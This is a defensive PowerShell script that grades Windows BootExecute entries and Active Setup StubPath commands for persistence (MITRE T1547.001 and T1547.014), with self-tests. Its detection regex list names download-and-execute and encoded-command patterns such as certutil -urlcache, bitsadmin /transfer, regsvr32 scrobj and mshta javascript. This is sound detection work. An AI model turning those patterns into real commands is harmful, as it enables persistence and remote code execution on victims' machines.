# boot_activesetup_check.ps1 -- grade the two Section 5 autostart points the
# bats only ever DUMPED: Session Manager's BootExecute (and its sibling
# values) and Active Setup's StubPath commands. Invoked from Section 5 of
# doze_sec.bat / doze_sec_noAdmin.bat.
#
# WHY (2026-11-26, I4b): Section 5 printed
#   --- BootExecute (SAFE: autocheck autochk * only) ---
# above a raw `reg query`, and a raw `reg query ... | findstr StubPath` below
# it. Nothing compared either with anything, so neither could ever raise a
# row: Section 5 read CLEAN whatever they held. THREAT_MODEL claimed Active
# Setup coverage that did not exist.
#
# BOOTEXECUTE (T1547.001). MITRE lists the BootExecute value of
# HKLM\SYSTEM\CurrentControlSet\Control\Session Manager under Registry Run
# Keys / Startup Folder: "the default value ... is set to autocheck autochk *"
# and adversaries add programs to it (attack.mitre.org/techniques/T1547/001).
# Session Manager runs every entry as a NATIVE program, as SYSTEM, before
# Windows has started -- before any security product. Sysinternals, "Inside
# Native Applications" (learn.microsoft.com/sysinternals/resources/
# inside-native-applications): the value "contains the names and arguments of
# programs that are executed by Session Manager ... Autocheck Autochk *", and
# Session Manager "looks in the <winnt>\system32 directory for the
# executables listed". chkntfs (learn.microsoft.com/windows-server/
# administration/windows-commands/chkntfs) rewrites the autochk entry's
# arguments -- /x excludes volumes (autochk /k:C *), /c schedules one -- so
# switches and \??\<volume> arguments on autochk are Windows' own. The
# siblings BootExecuteNoPnpSync, SetupExecute and PlatformExecute are run by
# the same Session Manager and are empty or absent on a normal machine; they
# are graded by the same rule.
#   OK       autochk with only switches, `*` and \??\<volume> arguments.
#   INFO     any other entry whose image is a validly Microsoft-signed file
#            in System32 -- named, never cleared silently.
#   WARNING  a validly signed non-Microsoft image (antivirus boot-time
#            scanners register here; so does persistence), an image that is
#            not on disk, or one whose file could not be read.
#   CRITICAL an image in a staging path, or one that is not validly signed:
#            an unsigned program running before Windows starts, as SYSTEM.
#
# ACTIVE SETUP (T1547.014). MITRE: "Adversaries may achieve persistence by
# adding a Registry key to the Active Setup of the local machine ... under
# HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\ ... a malicious
# StubPath", run at each user's next sign-in with that user's rights
# (attack.mitre.org/techniques/T1547/014). Windows, Edge and Chrome all keep
# StubPaths here, so presence is never the finding; the command is:
#   CRITICAL strong command content (encoded PowerShell, LOLBin download-and-
#            exec: the same list persistence_eval and startup_eval use, plus
#            the Windows launchers url.dll FileProtocolHandler/OpenURL,
#            shell32 ShellExec_RunDLL and msiexec from a URL), or a staging
#            path ANYWHERE in the line -- the program, the DLL a
#            rundll32/regsvr32 line loads, or a file handed to either.
#   WARNING  a script host (powershell, cmd, wscript, cscript, mshta) or a
#            script file; a DLL host handed a second file or path; a target
#            that is not validly signed, or whose file could not be read; a
#            missing target named without a folder (Windows also searches its
#            own folder and PATH) or outside Windows and Program Files (a file
#            placed there later runs).
#   INFO     a missing target under Windows or Program Files (a stale entry:
#            only an administrator could place it, nothing runs), or an entry
#            switched off (a DWORD IsInstalled of 0).
#   OK       a validly signed target outside staging paths, listed. Windows'
#            own `cmd.exe /D /C start <System32 program>` entry (the
#            ie4uinit -ClearIconCache one) is graded on the program it starts;
#            any other cmd line stays a script host.
#   The native Installed Components key is read through the 64-bit registry
#   view, so a 32-bit PowerShell cannot read the Wow6432Node copy twice.
#
# GAPS. Absence is decided only by ItemNotFoundException (the key) or by the
# value list (the value). A key or value that could not be read is
# `[WARNING] ... NOT performed`, with its own marker, never an all-clear.
# Session Manager and the native Installed Components key exist on every
# Windows, so their absence is a gap too; the Wow6432Node twin is optional.
#
# MARKERS (in -MarkerDir): dz_bootexec.txt / dz_activesetup.txt hold the
# finding severity; dz_bootexec_gap.txt / dz_activesetup_gap.txt the gap;
# dz_bootas_done.txt is written last (the bats raise "produced no verdict"
# without it).
#
# Windows PowerShell 5.1 compatible. Read-only: registry and file reads,
# Authenticode checks, marker writes. -SelfTest runs the pure graders only.

[CmdletBinding()]
param(
    [string]$MarkerDir = $env:TEMP,
    # CI-only: a planted Session Manager key and Installed Components roots
    # (throwaway HKCU keys). Prefixed Ci so no name collides,
    # case-insensitively, with a variable of the script.
    [string]$CiSessionKey = '',
    [string[]]$CiActiveSetupRoots = @(),
    [switch]$SelfTest
)

$ErrorActionPreference = 'Continue'

# Strong command-content indicators, kept in sync with persistence_eval.ps1
# and startup_eval.ps1.
$script:StrongContent = @(
    '-enc(odedcommand)?\b',
    '-e\s+[A-Za-z0-9+/=]{24,}',
    'frombase64string',
    'downloadstring', 'downloadfile',
    '(invoke-webrequest|\biwr\b|\bcurl\b|\bwget\b)[^\r\n]*https?:',
    '(iex|invoke-expression)\s*[\(\$]', '\|\s*(iex|invoke-expression)\b',
    'mshta\s+https?:', 'mshta\s+javascript', 'mshtml,runhtmlapplication',
    'certutil[^\r\n]*-urlcache', 'certutil[^\r\n]*-decode', 'bitsadmin[^\r\n]*/transfer',
    'regsvr32[^\r\n]*/i:http', 'regsvr32[^\r\n]*scrobj', 'rundll32[^\r\n]*javascript'
)
# Staging paths, anchored (\Users\Public\, never a bare \Public\: CLAUDE.md).
$script:StagingRx = '\\Temp\\|\\Downloads\\|\\Users\\Public\\|\\\$Recycle|\\ProgramData\\update'
$script:ScriptHosts = @('powershell.exe', 'pwsh.exe', 'cmd.exe', 'wscript.exe', 'cscript.exe', 'mshta.exe')
$script:ScriptExt = @('.vbs', '.vbe', '.js', '.jse', '.wsf', '.wsh', '.hta', '.ps1', '.bat', '.cmd')
$script:DllHosts = @('rundll32.exe', 'regsvr32.exe')
# Active Setup only: a signed Windows DLL host told to launch something else.
# url.dll,FileProtocolHandler / OpenURL and shell32.dll,ShellExec_RunDLL run
# whatever they are handed; msiexec installs from a URL. A Microsoft-signed
# host is no evidence about what it is told to run (review, 2026-11-26).
$script:LauncherContent = @('fileprotocolhandler', 'shellexec_rundll', '\bopenurl\b', 'msiexec[^\r\n]*https?:')
# A missing target under these folders needs an administrator to drop a file
# there, so the entry is stale; anywhere else, a file placed later runs.
$script:AdminOnlyRx = '^[A-Za-z]:\\(Windows|Program Files|Program Files \(x86\))\\'
$script:BootValues = @('BootExecute', 'BootExecuteNoPnpSync', 'SetupExecute', 'PlatformExecute')

# Pinned shared copies (tools/lint_shared_copies.ps1): byte-identical to
# the other tools' copies.
# Live. Four states, never two: nokey|unreadable|absent|present.
function Read-RegValueState {
    param([string]$KeyPath, [string]$Name)
    $k = $null
    try { $k = Get-Item -LiteralPath $KeyPath -ErrorAction Stop }
    catch {
        if ($_.Exception -is [System.Management.Automation.ItemNotFoundException]) { return @{ State = 'nokey'; Value = $null; Kind = ''; Error = '' } }
        return @{ State = 'unreadable'; Value = $null; Kind = ''; Error = ($_.Exception.GetType().Name + ': ' + $_.Exception.Message) }
    }
    try {
        if (@($k.GetValueNames()) -notcontains $Name) { return @{ State = 'absent'; Value = $null; Kind = ''; Error = '' } }
        return @{ State = 'present'; Value = $k.GetValue($Name, $null); Kind = [string]$k.GetValueKind($Name); Error = '' }
    } catch { return @{ State = 'unreadable'; Value = $null; Kind = ''; Error = ($_.Exception.GetType().Name + ': ' + $_.Exception.Message) } }
}

function Test-AbsentForSure {
    # A path is absent only when its parent ANSWERS without it, or the parent
    # itself does not exist (a browser that is not installed). A parent that
    # refuses to list is not an answer.
    param([string]$Path)
    $parent = [IO.Path]::GetDirectoryName($Path); $leaf = [IO.Path]::GetFileName($Path)
    if (-not $parent -or -not $leaf) { return $false }
    try { $names = @([IO.Directory]::GetFileSystemEntries($parent)) }
    catch [System.IO.DirectoryNotFoundException] { return $true }
    catch { return $false }
    foreach ($n in $names) { if ([IO.Path]::GetFileName($n) -eq $leaf) { return $false } }
    return $true
}

# Registry key last-write time, via RegQueryInfoKey (the provider does not
# expose it); every failure degrades to $null.
function Get-RegKeyLastWrite {
    param([string]$KeyPath)
    if (-not $KeyPath) { return $null }
    try {
        if (-not ([System.Management.Automation.PSTypeName]'DozeSec.RegTime').Type) {
            Add-Type -ErrorAction Stop -Namespace DozeSec -Name RegTime -MemberDefinition @'
[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
public static extern int RegQueryInfoKey(IntPtr hKey, System.Text.StringBuilder lpClass,
    IntPtr lpcchClass, IntPtr lpReserved, IntPtr lpcSubKeys, IntPtr lpcbMaxSubKeyLen,
    IntPtr lpcbMaxClassLen, IntPtr lpcValues, IntPtr lpcbMaxValueNameLen,
    IntPtr lpcbMaxValueLen, IntPtr lpcbSecurityDescriptor, out long lpftLastWriteTime);
'@
        }
    } catch { return $null }
    $key = $null
    try {
        # Accept both provider paths (HKLM:\...) and PSPath forms.
        $p = $KeyPath -replace '^Microsoft\.PowerShell\.Core\\Registry::', ''
        $p = $p -replace '^HKEY_LOCAL_MACHINE\\', 'HKLM:\' -replace '^HKEY_CURRENT_USER\\', 'HKCU:\'
        $key = Get-Item -LiteralPath $p -EA Stop
        $ft = [long]0
        $rc = [DozeSec.RegTime]::RegQueryInfoKey($key.Handle.DangerousGetHandle(),
            $null, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero,
            [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero,
            [IntPtr]::Zero, [ref]$ft)
        if ($rc -ne 0 -or $ft -le 0) { return $null }
        return [datetime]::FromFileTime($ft)
    } catch { return $null }
}

# WHEN did this appear? Registry times are per KEY; file times can be forged.
function Get-WhenLine {
    param([string]$KeyPath = '', [string]$FilePath = '')
    $parts = @()
    if ($KeyPath) {
        $lw = Get-RegKeyLastWrite $KeyPath
        if ($null -ne $lw) { $parts += ("registry key last modified {0}" -f $lw.ToString('yyyy-MM-dd HH:mm:ss')) }
    }
    if ($FilePath) {
        try {
            $f = Get-Item -LiteralPath $FilePath -EA Stop
            $parts += ("file written {0}" -f $f.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss'))
            # Creation AFTER last-write is the classic timestomp tell, so show
            # creation whenever the two disagree in either direction.
            if ($f.CreationTime -and $f.CreationTime -ne $f.LastWriteTime) {
                $parts += ("created {0}" -f $f.CreationTime.ToString('yyyy-MM-dd HH:mm:ss'))
            }
        } catch {}
    }
    if ($parts.Count -eq 0) { return $null }
    return ("  when: {0}" -f ($parts -join '  |  '))
}

$script:whenCaveatShown = $false
function Write-WhenCaveat {
    if ($script:whenCaveatShown) { return }
    $script:whenCaveatShown = $true
    '  note: registry times are per KEY (any value change updates them) and file times can be forged (timestomping, T1070.006) -- treat them as leads, not proof.'
}

# Expand the forms a command line's path takes (%vars%, \??\, \SystemRoot).
function Resolve-BinPath {
    param([string]$Raw)
    if (-not $Raw) { return '' }
    $p = [Environment]::ExpandEnvironmentVariables($Raw.Trim().Trim('"'))
    $p = $p -replace '^\\\?\?\\', '' -replace '^\\SystemRoot', $env:SystemRoot
    if ($p -match '^"') { $p = $p.Trim('"') }
    return $p
}

# The program an unquoted command line runs: CreateProcess tries each
# space-separated prefix and runs the first file that exists.
function Get-BinPath {
    param([string]$Raw, [scriptblock]$Exists = $null)
    if (-not $Raw) { return '' }
    $s = $Raw.Trim()
    if ($s.StartsWith('"')) {
        $end = $s.IndexOf('"', 1)
        if ($end -gt 1) { return $s.Substring(1, $end - 1) }
    }
    if ($null -eq $Exists) { $Exists = { param([string]$p) Test-Path -LiteralPath $p -PathType Leaf } }
    $tok = @($s -split ' ')
    $max = [Math]::Min($tok.Count, 16)
    for ($i = 1; $i -le $max; $i++) {
        $cand = ($tok[0..($i - 1)] -join ' ')
        if ($cand -notmatch '\.(exe|sys|dll)$') { continue }
        $hit = $false
        try { $hit = [bool](& $Exists (Resolve-BinPath $cand)) } catch { $hit = $false }
        if ($hit) { return $cand }
    }
    $m = [regex]::Match($s, '^[^\s]+\.(exe|sys|dll)', 'IgnoreCase')
    if ($m.Success) { return $m.Value }
    return $s
}

# PURE. Windows path arithmetic as strings: Join-Path asks the provider for
# the drive (it fails for a drive this machine lacks, and on Linux for every
# drive), and IO.Path splits on '/' only on Linux, so the self-test would not
# mean what it means on Windows.
function Join-WinPath { param([string]$A, [string]$B) return ($A.TrimEnd('\') + '\' + $B.TrimStart('\')) }
function Get-WinLeaf { param([string]$P) return (([string]$P) -split '\\')[-1] }

function Get-MaxSev {
    param([string]$A, [string]$B)
    if ($A -eq 'CRITICAL' -or $B -eq 'CRITICAL') { return 'CRITICAL' }
    if ($A -eq 'WARNING'  -or $B -eq 'WARNING')  { return 'WARNING' }
    return 'OK'
}

function Write-Marker {
    param([string]$Name, [string]$Sev)
    if ($Sev -eq 'OK') { return }
    # The marker IS the route to the findings ledger; a failed write prints.
    if (-not (Test-Path -LiteralPath $MarkerDir)) {
        New-Item -ItemType Directory -Path $MarkerDir -Force -EA SilentlyContinue | Out-Null
    }
    Set-Content -LiteralPath (Join-Path $MarkerDir ("dz_{0}.txt" -f $Name)) -Value $Sev -Encoding ASCII
}

function Get-OneLine {
    param([string]$Text)
    return ((([string]$Text) -replace '\s+', ' ').Trim())
}

# PURE. Is this BootExecute entry Windows' own disk check? autochk with only
# switches (/k:C, /q, /v, /m, /p ...), `*` and \??\<volume> arguments, with or
# without the `autocheck` keyword. Anything else -- another program, or an
# argument of another shape -- is graded on its image.
function Test-AutochkEntry {
    param([string]$Entry)
    return ([string]$Entry -match '^(?i)\s*(autocheck\s+)?autochk(\.exe)?(\s+(\*|/[a-z]+(:[^\s]*)?|\\\?\?\\([a-z]:|volume\{[0-9a-f-]+\})\\?))*\s*$')
}

# PURE. The native image a BootExecute entry runs. Session Manager takes the
# first word after the optional `autocheck` keyword and looks for it in
# System32, adding .exe; a \??\ path or a drive path names the file itself.
function Get-NativeImagePath {
    param([string]$Entry, [string]$SystemRoot = $env:SystemRoot)
    $e = ([string]$Entry).Trim() -replace '^(?i)autocheck\s+', ''
    $tok = (($e -split '\s+')[0]).Trim('"')
    if (-not $tok) { return '' }
    if ($tok -match '^\\\?\?\\') { $tok = $tok.Substring(4) }
    if ($tok -match '^(?i)\\SystemRoot\\') { $tok = $SystemRoot.TrimEnd('\') + $tok.Substring(11) }
    if ($tok -notmatch '^[A-Za-z]:\\' -and $tok -notmatch '^\\\\') { $tok = Join-WinPath (Join-WinPath $SystemRoot 'System32') $tok }
    if ((Get-WinLeaf $tok) -notmatch '\.') { $tok = $tok + '.exe' }
    return $tok
}

# PURE. One BootExecute-family entry. $Facts is the probe's answer for the
# image: @{ State = signed|unsigned|unverified|absent|unread; CN; Microsoft;
# Status; Why }.
function Get-BootEntryVerdict {
    param([string]$Value, [string]$Entry, [string]$Image, $Facts, [string]$SystemRoot = $env:SystemRoot)
    $e = Get-OneLine $Entry
    if (Test-AutochkEntry $e) { return @{ Sev = 'OK'; Line = "[OK] ${Value}: $e (Windows' boot-time disk check, the stock entry)" } }
    $run = "$Value entry '$e' runs $Image before Windows starts, as SYSTEM"
    if ($Image -match $script:StagingRx) { return @{ Sev = 'CRITICAL'; Line = "[CRITICAL] $run, from a staging path (T1547.001)." } }
    $st = [string]$Facts.State
    if ($st -eq 'absent') { return @{ Sev = 'WARNING'; Line = "[WARNING] $Value entry '$e' names $Image, which is not on disk -- Windows skips it at boot. A leftover of uninstalled software, or an implant whose file was removed or is yet to be dropped (T1547.001)." } }
    if ($st -eq 'unread') { return @{ Sev = 'WARNING'; Line = "[WARNING] $Value entry '$e' names $Image, whose file could not be read ($($Facts.Why)) -- not graded (T1547.001)." } }
    if ($st -eq 'unverified') { return @{ Sev = 'WARNING'; Line = "[WARNING] $run, and its signature could not be verified ($($Facts.Why)) (T1547.001)." } }
    if ($st -ne 'signed') { return @{ Sev = 'CRITICAL'; Line = "[CRITICAL] $run, and it is not validly signed ($($Facts.Status)) (T1547.001)." } }
    $sys32 = (Join-WinPath $SystemRoot 'System32') + '\'
    if ($Facts.Microsoft -and $Image.StartsWith($sys32, [StringComparison]::OrdinalIgnoreCase)) {
        return @{ Sev = 'OK'; Line = "[INFO] $Value entry '$e' runs $Image, validly signed by $($Facts.CN) -- a Windows native program in System32; context, not a finding." }
    }
    return @{ Sev = 'WARNING'; Line = "[WARNING] $run -- signed by $($Facts.CN). Antivirus boot-time scanners register here; anything else is persistence (T1547.001)." }
}

# PURE. The BootExecute family as a whole. $Reads maps each value name to a
# Read-RegValueState answer; $Probe is a scriptblock: image path -> facts.
function Get-BootReport {
    param([hashtable]$Reads, [scriptblock]$Probe, [string]$KeyLabel, [string]$SystemRoot = $env:SystemRoot)
    $lines = New-Object System.Collections.Generic.List[string]
    $sev = 'OK'; $gap = 'OK'; $hits = New-Object System.Collections.Generic.List[string]
    $n = 0
    foreach ($v in $script:BootValues) {
        $r = $Reads[$v]
        if ($null -eq $r) { continue }
        if ($r.State -eq 'nokey') {
            if ($v -eq 'BootExecute') { $lines.Add("[WARNING] BootExecute check NOT performed -- the Session Manager key ($KeyLabel) is not there. Every Windows has it, so the read did not reach the real key; a program run before Windows starts would go unseen (T1547.001)."); $gap = 'WARNING' }
            continue
        }
        if ($r.State -eq 'unreadable') {
            $lines.Add("[WARNING] $v check NOT performed -- $KeyLabel could not be read ($($r.Error)), so a program run before Windows starts would go unseen (T1547.001).")
            $gap = 'WARNING'; continue
        }
        if ($r.State -eq 'absent') {
            if ($v -eq 'BootExecute') { $lines.Add("[INFO] BootExecute value absent -- Windows normally holds 'autocheck autochk *' there, so the boot-time disk check is not registered. Nothing runs from it.") }
            continue
        }
        $entries = @($r.Value | ForEach-Object { [string]$_ } | Where-Object { $_.Trim() })
        foreach ($e in $entries) {
            $n++
            $img = ''
            if (-not (Test-AutochkEntry $e)) { $img = Get-NativeImagePath -Entry $e -SystemRoot $SystemRoot }
            $facts = @{ State = 'signed' }
            if ($img -and $img -notmatch $script:StagingRx) { $facts = & $Probe $img }
            $x = Get-BootEntryVerdict -Value $v -Entry $e -Image $img -Facts $facts -SystemRoot $SystemRoot
            $lines.Add($x.Line)
            if ($x.Sev -ne 'OK') { $sev = Get-MaxSev $sev $x.Sev; $hits.Add($img) }
        }
    }
    if ($sev -eq 'OK' -and $gap -eq 'OK') { $lines.Add("[OK] BootExecute and its sibling values hold only Windows' own entries ($n graded).") }
    return @{ Lines = @($lines.ToArray()); Sev = $sev; Gap = $gap; Hits = @($hits.ToArray()) }
}

# PURE. What an Active Setup StubPath runs: @{ Program; Target; Kind } where
# Target is the file the verdict is about -- the DLL for a rundll32/regsvr32
# line, the program otherwise. Kind: dllhost|scripthost|script|program|none.
# $Exists is the file probe Get-BinPath uses for an unquoted path with spaces.
function Get-StubTarget {
    param([string]$Stub, [scriptblock]$Exists = $null, [string]$SystemRoot = $env:SystemRoot)
    $out = @{ Program = ''; Target = ''; Kind = 'none'; Relative = $false; Extra = ''; Via = '' }
    if (-not $Stub) { return $out }
    $sys32 = Join-WinPath $SystemRoot 'System32'
    $bin = Get-BinPath -Raw $Stub -Exists $Exists
    $prog = Resolve-BinPath $bin
    if (-not $prog) { return $out }
    if ($prog -notmatch '^[A-Za-z]:\\' -and $prog -notmatch '^\\\\') { $prog = Join-WinPath $sys32 $prog; $out.Relative = $true }
    $out.Program = $prog
    $leaf = (Get-WinLeaf $prog).ToLowerInvariant()
    if ($script:DllHosts -contains $leaf) {
        $rest = [string]$Stub
        $ix = $rest.IndexOf($bin, [StringComparison]::OrdinalIgnoreCase)
        if ($ix -ge 0) { $rest = $rest.Substring($ix + $bin.Length) }
        $dll = ''
        $m = [regex]::Match($rest, '"([^"]+\.(?:dll|ocx|cpl))"', 'IgnoreCase')
        if (-not $m.Success) { $m = [regex]::Match($rest, '([A-Za-z]:\\[^",]*?\.(?:dll|ocx|cpl))(?=[,\s]|$)', 'IgnoreCase') }
        if (-not $m.Success) { $m = [regex]::Match($rest, '(?:^|\s)([^\s",/]+\.(?:dll|ocx|cpl))(?=[,\s]|$)', 'IgnoreCase') }
        if ($m.Success) { $dll = Resolve-BinPath $m.Groups[1].Value }
        if ($dll -and $dll -notmatch '^[A-Za-z]:\\' -and $dll -notmatch '^\\\\') { $dll = Join-WinPath $sys32 $dll }
        # Anything path- or file-shaped AFTER the DLL is something the host is
        # handed to open or run (Control_RunDLL <x.cpl>, an exe argument):
        # the signed DLL says nothing about it.
        if ($m.Success) {
            $after = $rest.Substring($m.Index + $m.Length)
            $x = [regex]::Match($after, '(?i)("?[A-Za-z]:\\[^"]*|\\\\\S+|%\w+%\S*|[^\s",]+\.(exe|dll|cpl|ocx|scr|com|pif|bat|cmd|ps1|vbs|vbe|js|jse|wsf|hta|msi|lnk)\b)')
            if ($x.Success) { $out.Extra = $x.Value.Trim() }
        }
        $out.Kind = 'dllhost'; $out.Target = $dll
        return $out
    }
    # Windows' own shape: {2D46B6DC-2207-486B-B523-A557E6D54B47} runs
    #   C:\Windows\system32\cmd.exe /D /C start C:\Windows\system32\ie4uinit.exe -ClearIconCache
    # cmd only starts a System32 program there, so that program is graded.
    # Only that exact shape: no other cmd syntax, the started program in
    # System32; anything else stays a script host.
    if ($leaf -eq 'cmd.exe' -and $Stub -notmatch '[&|<>^]') {
        $c = [regex]::Match($Stub, '(?i)cmd(\.exe)?"?\s+/D\s+/C\s+start\s+("?)([A-Za-z%][^"\s]*\.exe)\2(\s|$)')
        if ($c.Success) {
            $inner = Resolve-BinPath $c.Groups[3].Value
            if ($inner.StartsWith($sys32 + '\', [StringComparison]::OrdinalIgnoreCase) -and $inner.Substring($sys32.Length + 1) -notmatch '\\') {
                $out.Kind = 'program'; $out.Target = $inner; $out.Via = 'cmd /D /C start'; return $out
            }
        }
    }
    if ($script:ScriptHosts -contains $leaf) { $out.Kind = 'scripthost'; $out.Target = $prog; return $out }
    if ($script:ScriptExt -contains ([regex]::Match($leaf, '\.[^.]*$').Value)) { $out.Kind = 'script'; $out.Target = $prog; return $out }
    $out.Kind = 'program'; $out.Target = $prog
    return $out
}

# PURE. One Active Setup entry. $Facts: the probe's answer for the target.
function Get-StubVerdict {
    param([string]$Component, [string]$Stub, [string]$IsInstalled, $Target, $Facts)
    $s = Get-OneLine $Stub
    $label = "Active Setup '$Component'"
    if ([string]$IsInstalled -eq '0') { return @{ Sev = 'OK'; Line = "[INFO] $label is switched off (IsInstalled=0), so Windows does not run it: $s" } }
    foreach ($rx in @($script:StrongContent + $script:LauncherContent)) {
        if ($s -match $rx) { return @{ Sev = 'CRITICAL'; Line = "[CRITICAL] $label StubPath carries attack-shaped command content ($rx) and runs at every user's next sign-in: $s (T1547.014)" } }
    }
    $t = [string]$Target.Target
    if ($t -and $t -match $script:StagingRx) { return @{ Sev = 'CRITICAL'; Line = "[CRITICAL] $label StubPath runs $t from a staging path at every user's next sign-in: $s (T1547.014)" } }
    # The whole line, not only the program: a staged script handed to
    # powershell -File, or a staged file handed to a DLL host, is the same.
    $sx = $s
    try { $sx = [Environment]::ExpandEnvironmentVariables($s) } catch {}
    if ($sx -match $script:StagingRx) { return @{ Sev = 'CRITICAL'; Line = "[CRITICAL] $label StubPath hands a file in a staging path to $(Get-WinLeaf $Target.Program) at every user's next sign-in: $s (T1547.014)" } }
    if ($Target.Kind -eq 'scripthost') { return @{ Sev = 'WARNING'; Line = "[WARNING] $label StubPath runs a script host at every user's next sign-in: $s -- read what it runs (T1547.014)." } }
    if ($Target.Kind -eq 'script') { return @{ Sev = 'WARNING'; Line = "[WARNING] $label StubPath runs a script file at every user's next sign-in: $s -- read what it runs (T1547.014)." } }
    if ($Target.Kind -eq 'dllhost' -and $Target.Extra) { return @{ Sev = 'WARNING'; Line = "[WARNING] $label StubPath hands $(Get-WinLeaf $Target.Program) another file or path to open ($($Target.Extra)) at every user's next sign-in: $s -- the signed DLL says nothing about it (T1547.014)." } }
    if (-not $t) { return @{ Sev = 'WARNING'; Line = "[WARNING] $label StubPath names no file this check could resolve: $s -- read it by hand (T1547.014)." } }
    $st = [string]$Facts.State
    if ($st -eq 'absent' -and $Target.Relative -and $Target.Kind -eq 'program') { return @{ Sev = 'WARNING'; Line = "[WARNING] $label names a program without its folder, and it is not in System32: $s -- Windows also looks in its own folder and on PATH at sign-in, so a file placed there runs (T1547.014)." } }
    if ($st -eq 'absent' -and $t -notmatch $script:AdminOnlyRx) { return @{ Sev = 'WARNING'; Line = "[WARNING] $label names $t, which is not on disk, in a folder outside Windows and Program Files: a file placed there later runs at every user's next sign-in -- a left-behind entry, or one waiting for its file: $s (T1547.014)." } }
    if ($st -eq 'absent') { return @{ Sev = 'OK'; Line = "[INFO] $label names $t, which is not on disk -- a stale entry under a folder only an administrator can write: Windows' attempt fails and nothing runs. ($s)" } }
    if ($st -eq 'unread') { return @{ Sev = 'WARNING'; Line = "[WARNING] $label names $t, whose file could not be read ($($Facts.Why)) -- not graded: $s (T1547.014)." } }
    if ($st -eq 'unverified') { return @{ Sev = 'WARNING'; Line = "[WARNING] $label runs $t at every user's next sign-in, and its signature could not be verified ($($Facts.Why)): $s (T1547.014)." } }
    if ($st -ne 'signed') { return @{ Sev = 'WARNING'; Line = "[WARNING] $label runs $t at every user's next sign-in, and it is not validly signed ($($Facts.Status)): $s (T1547.014)." } }
    return @{ Sev = 'OK'; Line = "[OK] ${label}: $t (signed by $($Facts.CN))" }
}

# PURE. All Installed Components roots. $Roots: @( @{ Root; Required; State =
# ok|nokey|unreadable; Error; Unread = @(names); Entries = @( @{ Key; Name;
# Stub; IsInstalled } ) } ).
function Get-ActiveSetupReport {
    param([object[]]$Roots, [scriptblock]$Probe, [scriptblock]$Exists = $null, [string]$SystemRoot = $env:SystemRoot)
    $lines = New-Object System.Collections.Generic.List[string]
    $sev = 'OK'; $gap = 'OK'; $n = 0
    $hits = New-Object System.Collections.Generic.List[object]
    foreach ($r in @($Roots)) {
        if ($r.State -eq 'nokey') {
            if ($r.Required) { $lines.Add("[WARNING] Active Setup check NOT performed -- $($r.Root) is not there. Every Windows has it, so the read did not reach the real key; a command run at each user's sign-in would go unseen (T1547.014)."); $gap = 'WARNING' }
            continue
        }
        if ($r.State -eq 'unreadable') {
            $lines.Add("[WARNING] Active Setup check NOT performed -- $($r.Root) could not be read ($($r.Error)), so a command run at each user's sign-in would go unseen (T1547.014).")
            $gap = 'WARNING'; continue
        }
        $u = @($r.Unread | Where-Object { $_ })
        if ($u.Count) {
            $lines.Add(("[WARNING] Active Setup check NOT performed for {0} component(s) under {1} that could not be read: {2} -- a StubPath there cannot be audited, and a restricted key is how one would be hidden (T1547.014)." -f $u.Count, $r.Root, ($u -join ', ')))
            $gap = 'WARNING'
        }
        foreach ($e in @($r.Entries)) {
            if (-not ([string]$e.Stub).Trim()) { continue }
            $n++
            $tg = Get-StubTarget -Stub $e.Stub -Exists $Exists -SystemRoot $SystemRoot
            $facts = @{ State = 'signed' }
            if ($tg.Target -and $tg.Target -notmatch $script:StagingRx -and ($tg.Kind -eq 'program' -or $tg.Kind -eq 'dllhost')) { $facts = & $Probe $tg.Target }
            $comp = if ($e.Name) { "$($e.Key) ($($e.Name))" } else { [string]$e.Key }
            # A component name is attacker-chosen; an apostrophe in it would
            # end the quoted label every reader of the line splits on.
            $comp = $comp -replace "'", ''
            $x = Get-StubVerdict -Component $comp -Stub $e.Stub -IsInstalled $e.IsInstalled -Target $tg -Facts $facts
            $lines.Add($x.Line)
            if ($x.Sev -ne 'OK') { $sev = Get-MaxSev $sev $x.Sev; $hits.Add(@{ Key = (Join-WinPath $r.Root $e.Key); File = $tg.Target }) }
        }
    }
    if ($sev -eq 'OK' -and $gap -eq 'OK') { $lines.Add("[OK] Active Setup: $n StubPath command(s) graded, none suspicious.") }
    return @{ Lines = @($lines.ToArray()); Sev = $sev; Gap = $gap; Hits = @($hits.ToArray()) }
}

if ($SelfTest) {
    $fails = 0
    function T { param([string]$N, [bool]$Ok, [string]$Got)
        if ($Ok) { Write-Output "[OK]   $N" } else { Write-Output "[FAIL] $N$(if ($Got) { ": $Got" })"; $script:fails++ }
    }
    # Resolve-BinPath expands %SystemRoot% from the environment; pwsh on Linux
    # has none.
    $savedSR = $env:SystemRoot
    if (-not $env:SystemRoot) { $env:SystemRoot = 'C:\Windows' }
    $SR = $env:SystemRoot
    $ms = @{ State = 'signed'; CN = 'Microsoft Windows'; Microsoft = $true }
    # A probe that answers by the file's name, as the runner's disk would.
    $probe = {
        param([string]$p)
        $leaf = (Get-WinLeaf $p).ToLowerInvariant()
        switch ($leaf) {
            'chrmstp.exe'  { return @{ State = 'signed'; CN = 'Google LLC'; Microsoft = $false } }
            'aswboot.exe'  { return @{ State = 'signed'; CN = 'Gen Digital Inc.'; Microsoft = $false } }
            'agent.exe'    { return @{ State = 'unsigned'; Status = 'NotSigned' } }
            'evilnat.exe'  { return @{ State = 'unsigned'; Status = 'NotSigned' } }
            'gone.exe'     { return @{ State = 'absent' } }
            'nohere.exe'   { return @{ State = 'absent' } }
            'locked.exe'   { return @{ State = 'unread'; Why = 'Access to the path is denied.' } }
        }
        return $ms
    }
    $noFile = { param([string]$p) $false }

    # ---- BootExecute: Windows' own entries (benign twins, verbatim) ----
    foreach ($e in @('autocheck autochk *', 'Autocheck Autochk *', 'autocheck autochk /q /v *', 'autocheck autochk /k:C *',
                     'autocheck autochk /k:C /k:D *', 'autocheck autochk /p \??\C:', 'autocheck autochk /m \??\Volume{0b1e2c3d-0000-4000-8000-123456789abc}', 'autochk *')) {
        $v = Get-BootEntryVerdict -Value 'BootExecute' -Entry $e -Image '' -Facts $null -SystemRoot $SR
        T "BootExecute '$e' is Windows' own disk check: [OK], not raised" ($v.Sev -eq 'OK' -and $v.Line -like '`[OK`]*') $v.Line
    }
    T 'autochk with an argument of another shape is not the stock entry' (-not (Test-AutochkEntry 'autocheck autochk * evil')) ''
